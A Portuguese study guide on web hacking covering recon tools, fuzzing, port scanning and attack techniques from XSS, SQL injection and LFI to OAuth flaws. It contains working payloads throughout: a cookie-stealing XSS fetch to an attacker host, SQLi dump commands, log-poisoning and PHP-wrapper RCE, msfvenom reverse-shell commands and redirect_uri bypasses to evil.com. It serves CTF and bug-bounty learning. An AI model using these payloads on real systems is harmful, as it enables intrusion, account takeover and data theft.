# 📖 Essential Web Hacking

> Anotações de estudo sobre vulnerabilidades web, técnicas de reconhecimento e exploração.

---

## 🔎 Recon — Reconhecimento

> **Objetivo:** Mapear a superfície de ataque antes de procurar vulnerabilidades. Quanto mais informação coletamos, mais vetores de ataque aparecem.

### Subdomain Discovery
**subfinder** — [github.com/projectdiscovery/subfinder](https://github.com/projectdiscovery/subfinder)
Descobrir subdomínios de forma passiva (sem tocar o alvo diretamente).
- `-d` : Especificar o domínio alvo
- `-all` : Usa todas as fontes disponíveis
- `-silent` : Não exibe o banner/logo

### HTTP Probing
**httpx** — [github.com/projectdiscovery/httpx](https://github.com/projectdiscovery/httpx)
Verificar quais subdomínios estão ativos na web, status codes e tecnologias.
- `-sc` : Mostra o **Status Code** (200 = sucesso, 403 = proibido, 301 = redirect)
- `-td` : **Tech Detect** — identifica tecnologias rodando no site (Apache, Nginx, WordPress, etc.)

**aquatone** — [github.com/michenriksen/aquatone](https://github.com/michenriksen/aquatone)
Usado após o httpx para tirar screenshots automáticos de todos os subdomínios encontrados. Útil para análise visual rápida da superfície de ataque.

### URL Discovery & Crawling
**gau** — [github.com/lc/gau](https://github.com/lc/gau)
Busca URLs históricas de um domínio (Wayback Machine, Common Crawl, etc).

**katana** — [github.com/projectdiscovery/katana](https://github.com/projectdiscovery/katana)
Crawler moderno que percorre o site em tempo real buscando URLs e endpoints.
- `-u` : URL alvo
- `-d` : Profundidade do crawl (ex: 3 níveis)
- `-jc` : Ativa o crawler de arquivos **JavaScript** (**Essencial!** — APIs e endpoints são frequentemente definidos em JS)

### JavaScript Analysis
**SecretFinder** — [github.com/m4ll0k/SecretFinder](https://github.com/m4ll0k/SecretFinder)
Busca chaves de API, tokens, segredos e endpoints dentro de arquivos JavaScript.
- `-i [URL]` : URL do arquivo .js
- `-o cli` : Exibe resultado no terminal

### Parameter Discovery
**ParamSpider** — [github.com/devanshbatham/ParamSpider](https://github.com/devanshbatham/ParamSpider)
Descobre URLs que aceitam parâmetros (query strings) — fundamental para testar XSS, SQLi, LFI.

**kxss** — [github.com/tomnomnom/hacks/tree/master/kxss](https://github.com/tomnomnom/hacks/tree/master/kxss)
Recebe URLs com parâmetros e verifica se o valor reflete na resposta HTTP (indicador de XSS potencial). Usar junto com ParamSpider/gau.

### Vulnerability Scanning
**nuclei** — [github.com/projectdiscovery/nuclei](https://github.com/projectdiscovery/nuclei)
Scanner automatizado que usa templates para detectar vulnerabilidades conhecidas, misconfigurations, exposição de arquivos, CVEs, etc. É o canivete suíço do recon.

---

## 🔍 Fuzzing — Descoberta de Diretórios e Arquivos

> **Objetivo:** Encontrar diretórios, arquivos e endpoints ocultos no servidor que não são linkados na interface.

**Ferramentas:** [ffuf](https://github.com/ffuf/ffuf) / [wfuzz](https://wfuzz.readthedocs.io/en/latest/) + [SecLists](https://github.com/danielmiessler/SecLists)

**Exemplos de uso:**
```bash
# Fuzing de diretórios e extensões com wfuzz
wfuzz -c -z file,LISTA -z list,txt-php-html-bak-old --hc 404 --hw 194 ALVO.FUZ2Z

# Fuzzing de IDOR com cookie de sessão
wfuzz -c -z range,1-100 -H "Cookie: PHPSESSID=SUA_SESSAO" "http://ALVO/?action=home&user_id=FUZZ"

# Fuzzing de diretórios com ffuf
ffuf -u http://ALVO/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
```

> **Dica:** Sempre tente extensões como `.bak`, `.old`, `.swp`, `.env`, `.git` — desenvolvedores frequentemente esquecem esses arquivos no servidor.

---

## 📡 Port Scanning — Enumeração de Portas

> **Objetivo:** Descobrir quais portas e serviços estão ativos no servidor alvo.

**Ferramenta:** [nmap](https://nmap.org/)

| Flag | Função |
|---|---|
| `-sV` | Detecta versões dos serviços |
| `-p-` | Varre todas as 65.535 portas |
| `-sC` | Roda scripts NSE padrão de segurança |
| `-sS` | SYN scan (stealth — não completa o handshake) |
| `-A` | Modo agressivo (OS detection + scripts + versions) |
| `-Pn` | Pula detecção de host (útil se o alvo bloqueia ping) |

```bash
# Scan completo
nmap -sV -sC -p- ALVO

# Scan rápido das top 1000 portas
nmap -sV ALVO

# Scan stealth em todas as portas
nmap -sS -p- ALVO
```

**Portas importantes para ficar de olho:**
| Porta | Serviço | Interesse |
|---|---|---|
| 21 | FTP | Login anônimo? Versão vulnerável? |
| 22 | SSH | Brute force? Chaves expostas? |
| 80/443 | HTTP/HTTPS | Aplicação web principal |
| 3306 | MySQL | Banco de dados exposto? |
| 8080 | HTTP alt | Painel de admin? Tomcat? |
| 6379 | Redis | Acesso sem autenticação? |
| 27017 | MongoDB | Sem autenticação? |

---

## ⚡ Vulnerabilidades Web

---

### 🔍 XSS — Cross-Site Scripting

> **O que é:** Quando a aplicação permite que scripts JavaScript sejam executados no navegador da vítima porque o servidor não faz tratamento/sanitização da entrada do usuário.

**Impacto:** Roubo de cookies/sessão, keylogging, phishing, redirecionamento para sites maliciosos, manipulação do DOM.

#### XSS Reflected
Quando o servidor **devolve** o que o usuário enviou na resposta HTTP sem filtrar. O payload precisa ser enviado à vítima (via link malicioso, engenharia social). A execução **não é persistente** — só funciona quando a vítima clica no link.

> Ex: O site exibe `"Você buscou por: <script>alert(1)</script>"` — o script executa no browser da vítima.

#### XSS Stored
O payload é **armazenado** no servidor (em um comentário, campo de perfil, mensagem, etc.) e executado **toda vez** que alguém visualiza aquele conteúdo. Mais perigoso que o Reflected porque não precisa de engenharia social — qualquer usuário que acessar a página é afetado.

> Ex: Atacante coloca `<script>fetch('http://attacker/'+document.cookie)</script>` em um comentário. Todo mundo que carrega os comentários tem seu cookie roubado.

#### XSS DOM Based
O problema está no **front-end (JavaScript do cliente)**, não no servidor. O input do usuário é inserido diretamente no DOM via `innerHTML`, `document.write()`, `eval()`, jQuery `.html()`, etc., sem sanitização.

> Ex: A URL `?search=<img src=x onerror=alert(1)>` é inserida no DOM via `document.getElementById('result').innerHTML = param`.

#### Como se proteger (para entender a defesa):
- **Encoding de output** — Converter `<`, `>`, `"`, `'` para HTML entities
- **CSP (Content Security Policy)** — Header que restringe de onde scripts podem ser carregados
- **HttpOnly cookies** — Impede que JavaScript acesse cookies de sessão

---

### 💉 SQL Injection

> **O que é:** Quando o input do usuário é inserido diretamente em uma query SQL sem sanitização, permitindo que o atacante manipule o banco de dados.

**Impacto:** Leitura total do banco, bypass de autenticação, escrita de arquivos no servidor (webshell), execução de comandos (RCE).

#### Conceitos fundamentais de SQL
| Comando | Função |
|---|---|
| `SELECT` | Seleciona/lê dados de uma tabela |
| `INSERT` | Insere novos registros |
| `UPDATE` | Atualiza registros existentes |
| `DELETE` | Remove registros |
| `UNION` | Combina resultados de duas queries |
| `ORDER BY` | Ordena resultados (usado para descobrir nº de colunas) |

#### Metodologia de exploração manual
1. **Detectar a vulnerabilidade** — Inserir `'` e observar se causa erro
2. **Descobrir nº de colunas** — `ORDER BY 1`, `ORDER BY 2`... até dar erro
3. **Identificar colunas visíveis** — `UNION SELECT 1,2,3...` e ver quais números aparecem na página
4. **Fingerprint** — `@@version`, `database()`, `user()` para identificar o banco
5. **Enumerar tabelas** — Via `information_schema.tables`
6. **Enumerar colunas** — Via `information_schema.columns`
7. **Extrair dados** — `UNION SELECT username, password FROM users`
8. https://dencode.com/string/unicode-escape site para codificar as payloads

#### information_schema
Banco de **metadados** padrão que guarda os nomes de **todas** as tabelas e colunas do sistema. É a chave para descobrir a estrutura do banco.

```sql
-- Listar tabelas do banco atual
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() --

-- Listar colunas de uma tabela específica
') UNION SELECT null, column_name, null, null, null FROM information_schema.columns WHERE table_name = 'users' -- -
```

> **⚠️ Regra de ouro:** Para o `UNION` funcionar, a injeção DEVE ter **exatamente o mesmo número de colunas** que a query original da página.

#### SQLMap — Automação
Sequência clássica passo a passo:
```bash
sqlmap -u "http://alvo.com/page?id=1" --banner           # Fingerprint do banco
sqlmap -u "http://alvo.com/page?id=1" --dbs               # Listar databases
sqlmap -u "http://alvo.com/page?id=1" -D BANCO --tables   # Listar tabelas
sqlmap -u "http://alvo.com/page?id=1" -D BANCO -T TABELA --columns  # Listar colunas
sqlmap -u "http://alvo.com/page?id=1" -D BANCO -T TABELA -C user,password --dump  # Extrair dados
```

---

### 🐚 SQL Injection → WebShell

> **O que é:** Usar SQL Injection não apenas para ler dados, mas para **escrever arquivos** no servidor (via `INTO OUTFILE`) e obter execução de comandos (RCE).

**Requisitos:** O usuário MySQL precisa do privilégio `FILE` e `secure_file_priv` deve estar desabilitado ou apontando para o diretório web.

> **Importante:** `INTO OUTFILE` **não sobrescreve** arquivos existentes — sempre crie um nome novo!

**Fluxo de ataque:**
1. Identificar colunas e banco (como no SQLi normal)
2. Escrever uma webshell PHP via `INTO OUTFILE`
3. Acessar a webshell pelo navegador
4. Fazer upgrade para shell interativa

**Upgrade para shell interativo (após obter RCE):**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
SHELL=/bin/bash script -q /dev/null
# Ctrl+Z
stty raw -echo; fg
export SHELL=bash
export TERM=xterm-256color
```

---

### ⏱️ SQL Injection — Time-Based Blind

> **O que é:** Quando a aplicação é vulnerável a SQLi mas **não exibe** os resultados na página (nem erros, nem dados). A única forma de extrair informação é observando o **tempo de resposta** do servidor.

**Como funciona:**
- Usamos `IF()` com `SLEEP()` para fazer perguntas ao banco
- Se a resposta demora (ex: 5 segundos) → a condição é **verdadeira**
- Se responde instantaneamente → a condição é **falsa**

**Conceitos-chave:**
- `SUBSTRING(string, posição, tamanho)` — Extrai parte de uma string, caractere por caractere
- `IF(condição, verdade, falso)` — Condicional que decide se vai executar o `SLEEP`
- Combinando os dois: `IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)` — "O primeiro caractere do nome do banco é 'a'? Se sim, espere 5 segundos."

> Na prática, esse processo é **muito lento manualmente** (um caractere por vez). Por isso existem scripts automatizados e o próprio SQLMap.

---

### 🖥️ Command Injection

> **O que é:** Quando a aplicação executa comandos do sistema operacional usando input do usuário sem sanitizar. Permite rodar **qualquer comando** no servidor.

**Como funciona:** A aplicação pega o input e passa para uma função como `system()`, `exec()`, `os.popen()`, `subprocess.run()`, etc. Se o input não é filtrado, podemos "quebrar" o comando original e injetar o nosso.

**Separadores de comando:**
| Separador | Comportamento |
|---|---|
| `;` | Executa sequencialmente (independente do resultado) |
| `&&` | Executa o segundo **apenas se** o primeiro for bem-sucedido |
| `\|\|` | Executa o segundo **apenas se** o primeiro falhar |
| `\|` | Pipe — envia a saída para o próximo comando |
| `` ` `` | Backticks — substitui pela saída do comando |
| `$()` | Substituição de processo (alternativa moderna aos backticks) |

**Exemplo real:** Se a aplicação faz `ping <input>`:
```
Input: 127.0.0.1; cat /etc/passwd
Resultado: O ping executa E o cat também
```

> **Dica para CTFs:** Se `;`, `&&` e `|` são bloqueados, tente **backticks** (`` ` ``) ou `$()`. Se caracteres como `>` ou `/dev/tcp` são bloqueados, use **base64 encoding** para entregar o payload (como na máquina Retro.hc).

---

### 🔄 CSRF — Cross-Site Request Forgery

> **O que é:** O atacante faz o navegador da vítima **executar ações** em um site onde ela já está autenticada, sem que ela saiba. O browser envia automaticamente os cookies de sessão, validando a ação.

**Como funciona:**
1. Vítima está logada no site `alvo.com`
2. Vítima visita uma página maliciosa do atacante
3. A página maliciosa contém um formulário oculto que submete automaticamente para `alvo.com/change-password`
4. O navegador envia a requisição com o cookie de sessão da vítima → senha alterada!

**Condições necessárias para o ataque funcionar:**
- A ação no alvo é baseada **apenas em cookies** (sem token CSRF)
- O cookie **não tem** `SameSite=Strict` ou `SameSite=Lax` (para POST requests)
- A vítima precisa estar logada no momento do ataque

> **Defesas comuns:** Token CSRF (valor único por sessão/formulário), `SameSite` cookie attribute, verificação do header `Referer/Origin`.

---

### 📁 LFI — Local File Inclusion

> **O que é:** Quando a aplicação inclui/lê arquivos locais do servidor usando um parâmetro controlado pelo usuário. Navegando com `../` (path traversal), conseguimos ler arquivos sensíveis.

**Como identificar:** Procurar parâmetros que pareçam referenciar arquivos:
```
http://alvo.com/page?file=home.php
http://alvo.com/index.php?page=about
http://alvo.com/view?doc=manual.pdf
```
Se mudar para `../../etc/passwd` e o servidor retorna o conteúdo do arquivo → é LFI.

**Escalar LFI para RCE:**

**Log Poisoning** — O servidor web grava cada requisição nos arquivos de log (access log, error log). O campo **User-Agent** vai direto pro log sem sanitizar. A ideia é: você manda uma requisição com código PHP no User-Agent, o servidor grava esse código no arquivo de log, e depois você inclui o arquivo de log via LFI — o PHP interpreta o código que está "escondido" dentro do log.

Arquivos de log comuns para envenenar:
- `/var/log/apache2/access.log` — Apache (Debian/Ubuntu)
- `/var/log/httpd/access_log` — Apache (CentOS/RHEL)
- `/var/log/nginx/access.log` — Nginx
- `/var/log/auth.log` — Log de autenticação SSH (envenenar com username malicioso)
- `/proc/self/environ` — Variáveis de ambiente do processo (inclui User-Agent em alguns servidores)

Fluxo completo:
```
1. curl -A "<?php system($_GET['cmd']); ?>" http://alvo.com/
   → O User-Agent com PHP é gravado no access.log

2. http://alvo.com/page?file=../../../../var/log/apache2/access.log&cmd=id
   → O LFI inclui o log, o PHP é executado, o comando roda
```

**PHP Wrappers** — O PHP tem "wrappers" que permitem acessar diferentes fluxos de dados pela mesma função `include()`. Quando a aplicação faz `include($_GET['file'])`, você pode substituir o path de arquivo por um wrapper:

| Wrapper        | O que faz                                                  | Quando usar                                                               |
| -------------- | ---------------------------------------------------------- | ------------------------------------------------------------------------- |
| `php://filter` | Lê o código-fonte de arquivos PHP em base64 (sem executar) | Para ler o código da aplicação e encontrar credenciais, lógica de negócio |
| `php://input`  | Lê o corpo da requisição POST como arquivo                 | Para enviar código PHP via POST e executar                                |
| `data://`      | Transforma uma string em "arquivo" inline                  | Para executar código sem depender de arquivo no servidor                  |
| `expect://`    | Executa comando do sistema diretamente                     | Raro — precisa da extensão `expect` instalada                             |

Exemplos:
```
# Ler código-fonte de um arquivo PHP (sem executar)
?file=php://filter/convert.base64-encode/resource=config.php
→ Retorna o código em base64, decodificar para ver credenciais

# Executar código via POST (precisa de allow_url_include=On)
?file=php://input
POST body: <?php system('id'); ?>

# Executar código inline via data://
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
→ O base64 decodifica para: <?php system('id'); ?>
```

> **Dica importante:** O `php://filter` é o mais útil na prática porque **não precisa de `allow_url_include=On`** — funciona na maioria dos servidores. Use ele para ler `config.php`, `.env`, `wp-config.php` e qualquer arquivo com credenciais.

**Session injection** — Injetar código PHP no arquivo de sessão do PHP (geralmente em `/tmp/sess_SESSID`), depois incluir esse arquivo via LFI. Funciona quando os wrappers estão bloqueados e os logs não são acessíveis.

> **Dica:** Use o DevTools (F12) para ver se parâmetros estão sendo passados na URL ou em requisições AJAX — muitas vezes o LFI está escondido em chamadas assíncronas.

---

### 🗄️ NoSQL Injection

> **O que é:** Equivalente ao SQL Injection, mas para bancos **não-relacionais** como MongoDB. Em vez de queries SQL, manipulamos **operadores** do banco.

#### Diferença SQL vs NoSQL

**SQL (Relacional):**
```sql
SELECT * FROM users WHERE username='admin' AND password='senha';
```
Mais verificações, mais estruturado, mais lento.

**NoSQL (Não-Relacional — ex: MongoDB):**
Usa operadores de comparação em vez de SQL:

| Operador | Significado |
|---|---|
| `$eq` | Igual a |
| `$ne` | **Não** igual a (usado para bypass!) |
| `$gt` | Maior que |
| `$gte` | Maior ou igual |
| `$lt` | Menor que |
| `$in` | Contido em um array |
| `$regex` | Corresponde a expressão regular |

#### Bypass de Autenticação
A lógica: Se o banco verifica `username == X AND password == Y`, podemos usar `$ne` (not equal) para fazer `username != NADA AND password != NADA` → qualquer usuário com qualquer senha satisfaz!

**Via JSON (Burp Suite):**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$ne": "x"}}
```

**Via PHP array (formulários):**
```
username[$ne]=nada&password[$ne]=nada
```
> Podemos iterar combinações com `$regex` para descobrir usuário e senha caractere por caractere — processo similar ao Blind SQLi.

**Ferramenta:** Burp Suite para interceptar, visualizar e manipular as requisições.

---

### 🔐 IDOR — Insecure Direct Object Reference

> **O que é:** Quando a aplicação usa **referências diretas** (IDs, nomes de arquivo) para acessar recursos, e não verifica se o usuário tem **permissão** para acessar aquele recurso específico.

**Exemplo prático:** Você está logado como User ID 12 e acessa:
```
GET /api/user/12/profile  → Seu perfil ✅
GET /api/user/13/profile  → Perfil de OUTRA pessoa? Se funcionar → IDOR! 🚨
```

**Onde testar:**
- IDs numéricos sequenciais em URLs (`?id=1`, `?id=2`, `?id=3`)
- IDs em cookies ou headers
- IDs em requisições POST (corpo JSON ou form data)
- Filenames em downloads (`/download?file=meu_doc.pdf` → `outro_doc.pdf`)
- Métodos HTTP diferentes (`GET` funciona, mas `PUT /api/users/1` com `{"role":"admin"}` também?)

> **Ferramenta útil:** wfuzz/ffuf para enumerar IDs automaticamente com range.

---

### ⚡ Race Condition (TOCTOU)

> **O que é:** Quando a aplicação verifica uma condição e executa uma ação em momentos separados, e o atacante consegue **modificar o estado entre a verificação e a execução**. O nome técnico é TOCTOU — Time of Check to Time of Use.

**Analogia:** Imagine um porteiro que olha sua identidade (check), guarda ela na gaveta, e 3 segundos depois abre a porta (use). Nesse intervalo de 3 segundos, alguém troca a identidade na gaveta. O porteiro abre a porta confiando numa verificação que já não é mais válida.

**Onde aparece na prática:**

| Cenário | O que acontece |
|---|---|
| Cupom de desconto | Aplicação verifica se o cupom já foi usado, mas demora para marcar como usado → enviar 10 requests simultâneos = 10 descontos |
| Transferência bancária | Saldo é verificado, mas o débito demora → enviar 5 transferências ao mesmo tempo com saldo para apenas 1 |
| Votação / Like | Verifica se já votou → enviar vários votos antes do registro |
| Follow/Unfollow | Seguir alguém 100 vezes em 1 segundo para inflar contador |
| Resgate de gift card | Verificar saldo → usar → mas se enviar 2x ao mesmo tempo, resgata 2x o valor |

**Como funciona tecnicamente:**

A aplicação faz algo assim:
```
1. if (cupom_ja_usado == false)     ← VERIFICAÇÃO
2.     aplicar_desconto()            ← AÇÃO
3.     marcar_cupom_como_usado()     ← ATUALIZAÇÃO
```
Entre o passo 1 e o passo 3, existe uma janela de tempo. Se você enviar múltiplos requests nessa janela, todos passam pela verificação antes que qualquer um atualize o estado.

**Como explorar:**

1. **Identificar a ação vulnerável** — operações que verificam e modificam estado (pagamentos, cupons, votos, transferências)
2. **Enviar requests simultâneos** — Usar Burp Turbo Intruder, race-the-web, ou scripts Python com threading
3. **Observar se a ação foi executada mais de uma vez** — saldo negativo, cupom aplicado 2x, múltiplos votos

```python
# Exemplo simples com threading
import threading, requests

def usar_cupom():
    requests.post('http://alvo.com/aplicar-cupom', data={'code': 'DESC50'})

threads = [threading.Thread(target=usar_cupom) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

> **Em hacking:** Race Condition aparece muito em CTFs e Bug Bounty. Sempre que uma ação envolve "verificar algo → fazer algo → atualizar algo", teste com requests simultâneos. O Burp Suite com a extensão **Turbo Intruder** é a ferramenta ideal — permite enviar dezenas de requests em paralelo com timing preciso.

---

### 🌐 Subdomain Takeover

> **O que é:** Quando um subdomínio do alvo aponta (via CNAME DNS) para um **serviço externo** que não está mais ativo (S3 bucket deletado, Heroku app removido, etc.). O atacante pode reivindicar esse recurso e hospedar conteúdo malicioso no subdomínio legítimo do alvo.

**Como explorar:**
1. Enumerar subdomínios (subfinder)
2. Verificar CNAME com `dig` ou `nslookup`
3. Se o CNAME aponta para um serviço desativado → reivindicar

**Ferramentas:** `subfinder` + `httpx`, `nuclei -t takeovers/`

---

### ⚙️ Security Misconfiguration

> **O que é:** Quando o servidor, aplicação ou serviço está configurado de forma insegura — credenciais padrão, painéis de admin expostos, directory listing habilitado, serviços desnecessários ativos, etc.

**Exemplos comuns:**
- Tomcat com credenciais padrão (`tomcat:tomcat`) → Deploy de WAR malicioso
- Apache com directory listing → Exposição de arquivos
- `.git/` exposto no servidor → Download do código-fonte
- Debug mode ativado em produção → Stack traces com informações sensíveis
- Credenciais padrão em serviços (Redis sem senha, MongoDB sem auth)

**Gerar Reverse Shell com msfvenom:**
```bash
# WAR (para Tomcat)
msfvenom -p java/shell_reverse_tcp LHOST=SEU_IP LPORT=4444 -f war -o shell.war

# PHP
msfvenom -p php/reverse_php LHOST=SEU_IP LPORT=4444 -f raw -o shell.php

# Linux ELF
msfvenom -p linux/x86/shell_reverse_tcp LHOST=SEU_IP LPORT=4444 -f elf -o shell
```

---

### 🔗 API REST

> **O que é:** Uma interface que permite comunicação entre sistemas usando métodos HTTP (GET, POST, PUT, DELETE). APIs mal configuradas podem expor dados sensíveis, permitir escalação de privilégios, ou aceitar operações não autorizadas.

**Como encontrar APIs:**
- Fuzzing de endpoints (ffuf/wfuzz com wordlists de API)
- Análise de requisições no DevTools/Burp Suite
- Análise de arquivos JavaScript (SecretFinder)

**O que testar:**
- **Autenticação** — Endpoints sem autenticação? Token fraco?
- **Autorização** — Pode acessar dados de outros usuários? (IDOR)
- **Métodos HTTP** — GET funciona, mas e PUT/DELETE/PATCH?
- **Headers manipuláveis** — `X-Admin: true`, `X-User-Id: 1`, `X-Forwarded-For: 127.0.0.1`
- **Mass Assignment** — Enviar campos extras como `"role": "admin"` no POST/PUT

---

### 🔮 API GraphQL

> **O que é:** Linguagem de query para APIs que permite consultas flexíveis e eficientes. Diferente de REST, o cliente define **exatamente** quais dados quer receber.

**Principal vetor de ataque: Introspection**
GraphQL permite que você **descubra todo o schema** (tipos, queries, mutations) com uma única query. Se a introspection não está desabilitada → exposição total da estrutura da API.

**Ferramentas:** GraphQL Voyager para visualizar o schema graficamente após extrair a introspection.

> **Vulnerabilidades comuns:** Falta de rate limiting, queries aninhadas para DoS (query batching), falta de autorização por campo, introspection ativada em produção.

---

### 🌐 SSRF — Server-Side Request Forgery

> **O que é:** Quando conseguimos fazer o **servidor** enviar requisições HTTP para destinos que **nós controlamos**. Permite acessar serviços internos (que não são acessíveis de fora), metadados de cloud (AWS/GCP/Azure), e até interagir com Redis/MySQL internos.

**Quando testar:** Sempre que a aplicação aceitar uma URL como input (importar imagem de URL, webhook, preview de link, PDF generator, etc.)

**Perigo em Cloud:** Em AWS, o endpoint `http://169.254.169.254/latest/meta-data/` retorna credenciais IAM, chaves de acesso e informações sensíveis da instância.

---

### 📄 XXE — XML External Entity

> **O que é:** Quando a aplicação processa XML e não desabilita entidades externas. Permite ler arquivos do servidor, fazer SSRF e, em alguns casos, RCE.

**Onde aparece:** Upload de arquivos XML, SVG, DOCX/XLSX (que são ZIPs contendo XML internamente), APIs SOAP, configurações de aplicação.

**Conceito-chave:** Entidades XML funcionam como variáveis — `<!ENTITY xxe SYSTEM "file:///etc/passwd">` cria uma "variável" que contém o conteúdo do arquivo, e ao referenciar `&xxe;` no XML, o conteúdo é incluído.

---

### 📤 File Upload Bypass

> **O que é:** Quando a aplicação permite upload de arquivos e tenta filtrar extensões perigosas, mas o filtro pode ser bypassed para enviar uma webshell.

**Técnicas de bypass:** Extensões alternativas (.phtml, .php5), double extension (.php.jpg), magic bytes (GIF89a), Content-Type falso, .htaccess upload, null byte.

> **Regra:** Sempre que encontrar um upload, teste! Mesmo que pareça aceitar "só imagens".

---

### 🔑 JWT — JSON Web Token

> **O que é:** Tokens usados para autenticação stateless. São compostos por `HEADER.PAYLOAD.SIGNATURE` em base64. Se mal configurados, podem ser forjados.

**Ataques principais:**
- `alg: none` — Remove a verificação de assinatura
- **Brute force** do secret com hashcat/john
- **Key confusion** — Trocar RS256 por HS256 e assinar com a chave pública

---

### 🔓 OAuth / SSO — Ataques em Autenticação Terceirizada

> **O que é:** OAuth2 é o protocolo que permite "Login com Google/GitHub/Facebook". Em vez de a aplicação gerenciar senhas, ela delega a autenticação para um **provedor externo** (Google, GitHub, etc.). Se o fluxo é implementado errado, o atacante pode roubar tokens, sequestrar contas ou fazer login como qualquer usuário.

**Diferença rápida OAuth vs SSO:**
- **OAuth2** — Protocolo de **autorização**. Permite que uma app acesse dados do usuário em outro serviço (ex: app X lê seus repos do GitHub). O "Login com Google" é um uso comum, mas tecnicamente é construído sobre OAuth2 + OpenID Connect.
- **SSO (Single Sign-On)** — Conceito de **autenticação única**. Você loga uma vez e acessa vários serviços. OAuth2 é frequentemente a tecnologia por trás, mas SSO pode usar SAML, CAS, ou outros protocolos.

**Os 4 papéis do OAuth2:**

| Papel | Quem é | Exemplo |
|---|---|---|
| **Resource Owner** | O usuário (dono dos dados) | Você |
| **Client** | A aplicação que quer acessar os dados | app.com |
| **Authorization Server** | Quem autentica e emite tokens | accounts.google.com |
| **Resource Server** | Quem tem os dados protegidos | api.google.com/userinfo |

**Como funciona o fluxo OAuth2 — Authorization Code (o mais comum):**

```
USUÁRIO                    APP (client)              GOOGLE (auth server)
   │                           │                           │
   │  1. Clica "Login Google"  │                           │
   │──────────────────────────►│                           │
   │                           │  2. Redirect com:         │
   │                           │     client_id=XXX         │
   │                           │     redirect_uri=app.com  │
   │                           │     scope=email           │
   │                           │     state=RANDOM123       │
   │◄──────────────────────────│──────────────────────────►│
   │                           │                           │
   │  3. Usuário autentica no Google e autoriza            │
   │──────────────────────────────────────────────────────►│
   │                           │                           │
   │  4. Google redireciona de volta:                      │
   │     app.com/callback?code=ABC123&state=RANDOM123      │
   │◄──────────────────────────────────────────────────────│
   │                           │                           │
   │                           │  5. App envia code ao     │
   │                           │     Google (server-side)  │
   │                           │     e recebe ACCESS TOKEN │
   │                           │──────────────────────────►│
   │                           │◄──────────────────────────│
   │                           │                           │
   │                           │  6. App usa o token para  │
   │  7. Usuário logado!       │     buscar dados (email)  │
   │◄──────────────────────────│                           │
```

**Parâmetros importantes (o que cada um faz):**

| Parâmetro | Função | Se falta ou é fraco... |
|---|---|---|
| `client_id` | Identifica a aplicação | Não é secreto — pode ser público |
| `redirect_uri` | Para onde o Google envia o code/token | Se não é validado → **roubo de token** |
| `state` | Token anti-CSRF aleatório | Se falta → **CSRF no callback** (account takeover) |
| `scope` | Que permissões a app pede | Se manipulável → **acesso além do esperado** |
| `code` | Código temporário trocado pelo token | Se interceptado → atacante pega o token |
| `response_type` | `code` (seguro) ou `token` (menos seguro) | `token` no fragment da URL é mais fácil de vazar |

**Vetores de ataque detalhados:**

**1. redirect_uri manipulation (mais comum)**

O `redirect_uri` diz pro Google: "depois que o usuário autenticar, redirecione para essa URL com o code". Se a aplicação não valida estritamente esse parâmetro, o atacante troca para uma URL que ele controla:

```
URL legítima:
https://google.com/auth?client_id=APP&redirect_uri=https://app.com/callback&scope=email

URL manipulada:
https://google.com/auth?client_id=APP&redirect_uri=https://evil.com/steal&scope=email
→ O code vai para evil.com em vez de app.com!
```

Variações de bypass quando a app tenta validar:
```
# App valida só o domínio base
redirect_uri=https://app.com.evil.com/callback

# App valida com startswith
redirect_uri=https://app.com/callback/../../../evil.com

# App aceita subdomínios
redirect_uri=https://evil.app.com/callback

# Encoding
redirect_uri=https://app.com%40evil.com/callback

# Fragmento
redirect_uri=https://app.com/callback#@evil.com

# URL com porta
redirect_uri=https://app.com:8443@evil.com/callback
```

**2. CSRF no callback (state ausente)**

O parâmetro `state` é um valor aleatório que a app gera antes de redirecionar pro Google e confere quando o callback volta. Se não existe ou não é validado, o ataque funciona assim:

```
1. Atacante inicia "Login com Google" com a conta DELE
2. Google autentica → gera callback: app.com/callback?code=ATACANTE_CODE
3. Atacante NÃO usa esse link. Intercepta e guarda.
4. Atacante envia esse link para a VÍTIMA (phishing, chat, etc.)
5. Vítima clica → app.com recebe o code do ATACANTE
6. A app vincula a conta OAuth do ATACANTE à sessão da VÍTIMA
→ Resultado: Atacante faz "Login com Google" e entra na conta da vítima
```

**3. Token leaking via Referer**

Se o fluxo usa `response_type=token` (implicit flow), o token vai direto na URL:
```
app.com/callback#access_token=TOKEN_AQUI
```
Se a página do callback tem imagens, scripts ou links para sites externos, o browser envia o header `Referer` com a URL completa — incluindo o token. O site externo recebe o token de graça.

**4. Open Redirect + OAuth (combo attack)**

Se a app tem um Open Redirect em qualquer endpoint (ex: `app.com/redirect?url=evil.com`), o atacante pode usar esse endpoint como `redirect_uri`:
```
redirect_uri=https://app.com/redirect?url=https://evil.com/steal
→ Google valida: "sim, é app.com" ✅
→ App redireciona para evil.com com o code/token ❌
```

> **Em hacking:** OAuth é um dos vetores mais lucrativos em Bug Bounty porque qualquer falha leva a **account takeover**. Sempre que encontrar "Login com X", intercepte o fluxo inteiro no Burp Suite. Observe cada parâmetro: `redirect_uri`, `state`, `code`, `token`, `scope`. Manipule cada um separadamente. Teste especialmente se o `state` existe e se o `redirect_uri` aceita variações.

---

### 🧩 SSTI — Server-Side Template Injection

> **O que é:** Quando input do usuário é inserido diretamente em um template engine (Jinja2, Twig, ERB) e processado como código. Pode levar a RCE.

**Detecção:** Enviar `{{7*7}}` — se retorna `49`, o template está processando a expressão.

---

### 🧬 Insecure Deserialization

> **O que é:** Quando a aplicação desserializa dados controlados pelo usuário sem validação. Permite manipular objetos e, frequentemente, executar código arbitrário.

**Onde aparece:** Cookies serializados, dados em base64 em parâmetros, APIs que recebem objetos serializados (Java, PHP, Python pickle).

---

### ↩️ Open Redirect

> **O que é:** Quando a aplicação redireciona para URLs externas sem validação. Usado para phishing sofisticado (a URL parece legítima porque começa com o domínio do alvo) e para roubo de tokens OAuth.

**Parâmetros comuns:** `?redirect=`, `?url=`, `?next=`, `?return=`, `?redirect_uri=`

---

### 🔴 SQL Injection — Error-Based

> **O que é:** Variação do SQL Injection onde o atacante **induz o banco a gerar mensagens de erro** que contêm os dados sensíveis. É mais rápido que o Time-Based porque não depende de delay — a resposta chega imediatamente contendo a informação escondida dentro do erro SQL.

